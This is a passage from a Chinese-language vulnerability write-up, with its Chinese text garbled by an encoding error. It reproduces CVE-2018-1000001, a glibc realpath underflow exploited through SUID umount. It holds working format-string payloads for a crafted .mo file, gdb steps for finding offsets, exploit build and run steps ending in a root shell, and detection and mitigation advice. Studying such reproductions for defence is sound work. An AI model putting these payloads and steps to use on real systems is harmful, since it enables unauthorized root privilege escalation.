<p>umountè¿›ç¨‹åœ¨çˆ¶è¿›ç¨‹ç¬¬1æ­¥å®Œæˆåæ¢å¤æ‰§è¡Œï¼Œè¯»å–ç¬¬äºŒé˜¶æ®µmoæ–‡ä»¶ï¼Œå…¶ä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†ä¼šä¿®æ”¹umountçš„è¿”å›åœ°å€ï¼Œé€šè¿‡setdate+execlå®ç°ROPï¼Œæœ€ç»ˆæ‰§è¡ŒDATEMSKæ–‡ä»¶ä¸­çš„expè¿›ç¨‹ï¼Œåˆ©ç”¨umountæå‡expå¯æ‰§è¡Œæ–‡ä»¶çš„æƒé™åæ‰§è¡Œï¼Œç”Ÿæˆroot shellå®Œæˆææƒ</p>
</li>
<li>
<p>dumpæ ˆå†…å­˜ï¼Œä¿®æ”¹restrictedå­—æ®µï¼Œä¿®æ”¹AANGUAGEç¯å¢ƒå˜é‡ä½¿ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
</li>
</ul>
<p><code>shell
  "AA%6$lnAAAAAA%016lx(çœç•¥... å…±256ä¸ª%016lx)%016lx%1$68hhx%256$hhn"</code></p>
<ul>
<li>ä¿®æ”¹è¿”å›åœ°å€ä½¿ç”¨çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</li>
</ul>
<p>```shell
  debian@debian:~/Desktop/work$ msgunfmt "/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo" -o util-linux.po
  debian@debian:~/Desktop/work$ cat util-linux.po 
  msgid ""
  msgstr ""
  "Language: en\n"
  "MIME-Version: 1.0\n"
  "Content-Type: text/plain; charset=UTF-8\n"
  "Content-Transfer-Encoding: 8bit\n"</p>
<p>msgid "%s: mountpoint not found"
  msgstr ""
  "%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn"
  "%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn"
  "%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-"
  "%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s\n"</p>
<p>msgid "%s: not mounted"
  msgstr "BBBB5678%3$s\n"</p>
<p>msgid ""
  "%s: target is busy\n"
  "        (In some cases useful info about processes that\n"
  "         use the device is found by lsof(8) or fuser(1).)"
  msgstr "BBBBABCD%s\n"</p>
<p>```</p>
<h4 id="bexp">b.EXPæºç </h4>
<p>â€‹   å¤ç°ç¯å¢ƒexp: è§é™„ä»¶cve-2018-1000001-01.md</p>
<p>â€‹   åŸä½œè€…exp: <a href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c">exp.c</a></p>
<h4 id="c_1">c.å¤ç°æ­¥éª¤</h4>
<ul>
<li>
<p>æ­å»ºå¤ç°ç¯å¢ƒï¼Œä¸POCä¸­çš„ç¯å¢ƒç›¸åŒ</p>
</li>
<li>
<p>æ­¥éª¤ä¸€ è®¾ç½®unprivileged_userns_cloneæƒé™</p>
</li>
</ul>
<p><code>shell
   # å°†unprivileged_userns_cloneè®¾ç½®ä¸º1(é»˜è®¤ä¸º0)
   root$ echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone</code></p>
<ul>
<li>æ­¥éª¤äºŒ  ç¼–è¯‘expæ–‡ä»¶</li>
</ul>
<p>ä½¿ç”¨çš„æ˜¯ä¿®æ”¹è¿‡çš„expï¼Œå…·ä½“ä¿®æ”¹äº†åŠ è½½moçš„ç›®å½•å’Œexeclçš„ç›¸å¯¹åç§»ä»¥é€‚é…å¤ç°ç¯å¢ƒ</p>
<p><code>shell
  gcc exp.c -o exp</code></p>
<ul>
<li>æ­¥éª¤ä¸‰ æ‰§è¡Œexp</li>
</ul>
<p>```shell
  debian@debian:~/Desktop/work$ id
  uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)
  debian@debian:~/Desktop/work$ ./exp
  ./exp: invoked as SUID, invoking shell ...
  root@debian:~/Desktop/work# id
  uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)
  root@debian:~/Desktop/work# </p>
<p>```</p>
<ul>
<li>å¦‚ä½•è·å–util-linx.moæ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„</li>
</ul>
<p>```shell
  # å®šä½åˆ°_nl_find_msgè°ƒç”¨ï¼Œæ‰¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„å€¼
  char <em>_nl_find_msg (struct loaded_l10nfile </em>domain_file,
            struct binding <em>domainbinding, const char </em>msgid,
            int convert, size_t *lengthp)
       internal_function;</p>
<p># Terminal 1
  /usr/bin/unshare -m -U --map-root-user /bin/bash
  mount -t tmpfs tmpfs /tmp
  cd /tmp
  chmod 00755 .
  mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES" "(unreachable)/x" 
  ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
  echo $$
  46416</p>
<p># Terminal 2
  cd /proc/46416/cwd
  gdb
  file /bin/umount
  set args --lazy down 
  set env LC_ALL=C.UTF-8
  b main
  r
  b <em>umount_one if </em>(char <em>)$rsi == '('
  c
  b mk_exit_code
  c
  b </em>__dcigettext+1265
  c</p>
<p># é€šè¿‡è°ƒç”¨ä¿¡æ¯æ‰¾åˆ°ç¬¬ä¸€ä¸ªå‚æ•°
  "(unreachable)/tmp/<strong>gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo"
  # å› æ­¤ç›¸å¯¹è·¯å¾„åº”æ”¹ä¸ºï¼š</strong>gconv_find_shlib(åŸexpä¸­æ˜¯from_archive)
  [---------------------------------registers-------------------------
  ...
  RCX: 0x1 
  RDX: 0x55698c49ee78 ("%s: not mounted")
  RSI: 0x55698e233200 ("AAAAAA/A")
  RDI: 0x55698e23be90 --&gt; 0x55698e23c3b0 ("(unreachable)/tmp/<strong>gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo")
  ...
  R8 : 0x7fff5515b1b8 --&gt; 0x7fb5d5b84000 --&gt; 0x7fb5d572e000 --&gt; 0x10102464c457f 
  ...
  [-------------------------------------code-------------------------
  ...
  =&gt; 0x7fb5d4d69d21 &lt;</strong>dcigettext+1265&gt;:    call   0x7fb5d4d68bc0 &lt;_nl_find_msg&gt;
   ...
  Guessed arguments:
  arg[0]: 0x55698e23be90 --&gt; 0x55698e23c3b0 ("(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo")
  arg[1]: 0x55698e233200 ("AAAAAA/A")
  arg[2]: 0x55698c49ee78 ("%s: not mounted")
  arg[3]: 0x1 
  arg[4]: 0x7fff5515b1b8 --&gt; 0x7fb5d5b84000 --&gt; 0x7fb5d572e000 --&gt; 0x10102464c457f </p>
<p>Breakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (
  ...
  gdb-peda$ </p>
<p># è°ƒç”¨æ ˆå¦‚ä¸‹
  gdb-peda$ bt
  #0  0x00007fb5d4d69d21 in <strong>dcigettext (
      domainname=0x55698e233580 "util-linux", 
      msgid1=0x55698c49ee78 "%s: not mounted", 
      msgid2=0x0, plural=0x0, n=0x0, 
      category=0x5) at dcigettext.c:742
  #1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)
      at sys-utils/umount.c:206
  #2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...
  #3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...
  #4  0x00007fb5d4d5c2e1 in </strong>libc_start_main (main=0x55698c49c970 ...
  #5  0x000055698c49d3aa in _start ()</p>
<p>```</p>
<ul>
<li>å¦‚ä½•åœ¨umountä¸­dumpæ ˆå†…å­˜çš„ä½ç½®ä¸‹æ–­ç‚¹</li>
</ul>
<p>```shell
  gcc my_exp.c -o exp4dbg -g
  gdb
  file exp4dbg
  b main
  r
  set follow-fork-mode parent
  b attemptEscalation
  c
  set follow-fork-mode child
  c
  b <em>umount_one if </em>(char <em>)$rsi == '('
  c
  b mk_exit_code
  c
  b </em>mk_exit_code+165
  c</p>
<p>=&gt; 0x561465315695 <mk_exit_code+165>: call   0x561465314560 <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#119;&#97;&#114;&#110;&#120;&#64;&#112;&#108;&#116;">&#119;&#97;&#114;&#110;&#120;&#64;&#112;&#108;&#116;</a></p>
<p>gdb-peda$ bt
  #0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...
  #1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...
  #2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, 
  ...
  #3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...
  #4  0x00005614653153aa in _start ()
  gdb-peda$ </p>
<p>```</p>
<h4 id="d">d.åˆ©ç”¨æ ¸å¿ƒè¦ç´ </h4>
<ul>
<li>
<p>åˆ©ç”¨è¶Šç•Œå†™æ¼æ´ï¼Œæ§åˆ¶gettextå‡½æ•°åŠ è½½ç‰¹åˆ¶çš„NLSæ–‡ä»¶ï¼Œæ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²</p>
</li>
<li>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²dumpæ ˆå†…å­˜æ ¹æ®æ ˆå†…ç›¸å¯¹åç§»è·å–libcåŸºåœ°å€ç»•è¿‡ASLR</p>
</li>
<li>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹æ ˆå†…å­˜å‡½æ•°å‚æ•°å’Œè¿”å›åœ°å€è¿›è€Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹</p>
</li>
<li>
<p>é€šè¿‡setdateè¿™æ ·çš„ç®€å•å‡½æ•°ä¸ºexeclæ„é€ åˆé€‚çš„æ ˆç¯å¢ƒå®ç°ROP</p>
</li>
<li>
<p>é€šè¿‡æ§åˆ¶suidè¿›ç¨‹umountçš„æ‰§è¡Œæµç¨‹æ¥åˆ›å»ºroot shellå®ç°ææƒ</p>
</li>
</ul>
<h3 id="5">5.é˜²æŠ¤å»ºè®®</h3>
<ul>
<li>æ£€æŸ¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨é£é™©ï¼ŒåŠæ—¶æ›´æ–°ç³»ç»Ÿï¼Œå®‰è£…è¡¥ä¸ã€‚æ£€æµ‹æ–¹å¼å¦‚ä¸‹ï¼š</li>
</ul>
<p>```shell
  # æ–¹å¼ä¸€ï¼š
  # Terminal 1
  $ sudo echo 1 &gt; /proc/sys/kernel/unprivileged_userns_clone
  $ /usr/bin/unshare -m -U --map-root-user /bin/bash
  $ mount -t tmpfs tmpfs /tmp
  $ cd /tmp
  $ echo $$
  2607</p>
<p># Terminal 2
  $ cd /proc/2607/cwd
  $ realpath .
  (unreachable)/tmp
  # å¦‚æœè¿”å›å€¼åŒ…å«(unreachable)å­—ç¬¦ä¸²åˆ™å¯ä»¥åˆ¤æ–­å­˜åœ¨é£é™©</p>
<p># æ–¹å¼äºŒï¼š
  # æŸ¥çœ‹glibcçš„packageæ›´æ–°æ—¥å¿—æ˜¯å¦å­˜åœ¨CVE-2018-1000001çš„è¡¥ä¸
  # ä»¥å®‰è£…äº†è¡¥ä¸çš„ubuntu16ä¸ºä¾‹ï¼š
  $ PAGER=cat apt-get -q=2 changelog libc6
  ...
    * SECURITY UPDATE: Buffer underflow in realpath()
      - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:
        Make getcwd(3) fail if it cannot obtain an absolute path
      - CVE-2018-1000001
  ...</p>
<p>```</p>
<ul>
<li>
<p>æ ¹æ®åˆ†æï¼Œè¯¥æ¼æ´åˆ©ç”¨éœ€è¦å¼€å¯unprivileged_userns_cloneæƒé™ï¼Œæ‰€ä»¥åœ¨ç´§æ€¥æƒ…å†µä¸‹ï¼Œæœ€å¿«é€Ÿï¼Œæ–¹ä¾¿çš„é˜²æŠ¤æ–¹å¼æ˜¯æ£€æŸ¥è¯¥é…ç½®ï¼Œå¹¶ç¡®ä¿å…¶åœ¨ä¸éœ€è¦çš„æƒ…å†µä¸‹å…³é—­ä»¥é˜»æ–­æ¼æ´åˆ©ç”¨çš„åŸºç¡€(ä½†æ˜¯æ­¤é…ç½®æ˜¯æŸäº›å®¹å™¨åº”ç”¨çš„åŸºç¡€)ã€‚</p>
</li>
<li>
<p>ç”±äºæ¼æ´åˆ©ç”¨é€šè¿‡è¯­è¨€æ”¯æŒæ–‡ä»¶å®ç°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³¨å…¥ï¼Œå› æ­¤ç›‘æ§ç³»ç»Ÿçš„è¯­è¨€æ”¯æŒæ–‡ä»¶èƒ½å¤Ÿèµ·åˆ°ä¸€å®šä½œç”¨ã€‚ä¾‹å¦‚ï¼Œç›‘æ§è¿›ç¨‹è¯»å–å’Œåˆ›å»ºçš„.moæ–‡ä»¶æ˜¯å¦æœ‰å¼‚å¸¸çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²(æ¯”å¦‚åŒ…å«%n, %$çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²)ï¼Œå¯ä»¥åªåœ¨åˆ›å»ºçš„æ—¶å€™æ£€æµ‹å‡å°‘æ€§èƒ½æŸå¤±ï¼š</p>
</li>
</ul>
<p><code>shell
  root@debian:/usr/share/locale/gl/LC_MESSAGES/# file util-linux.mo
  util-linux.mo: GNU message catalog (little endian), revision 0.0, 214 messages</code></p>
<h3 id="6">6.å‚è€ƒ</h3>
<p><a href="https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/">LibcRealpathBufferUnderflow</a>
https://www.freebuf.com/column/162202.html
https://bbs.pediy.com/thread-228678.htm</p>
              
            </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="../cve-2019-12735-01/" class="btn btn-neutral float-right" title="Cve 2019 12735 01">Next <span class="icon icon-circle-arrow-right"></span></a>
      
      
        <a href="../cve-2018-1000001-01/" class="btn btn-neutral" title="Cve 2018 1000001 01"><span class="icon icon-circle-arrow-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <!-- Copyright etc -->
    
  </div>

  Built with <a href="http://www.mkdocs.org">MkDocs</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>.
</footer>
	  
        </div>
      </div>

    </section>
    
  </div>

  <div class="rst-versions" role="note" style="cursor: pointer">
    <span class="rst-current-version" data-toggle="rst-current-version">
      
      
        <span><a href="../cve-2018-1000001-01/" style="color: #fcfcfc;">&laquo; Previous</a></span>
      
      
        <span style="margin-left: 15px"><a href="../cve-2019-12735-01/" style="color: #fcfcfc">Next &raquo;</a></span>
      
    </span>
</div>
    <script src="../js/theme.js"></script>

</body>
</html>
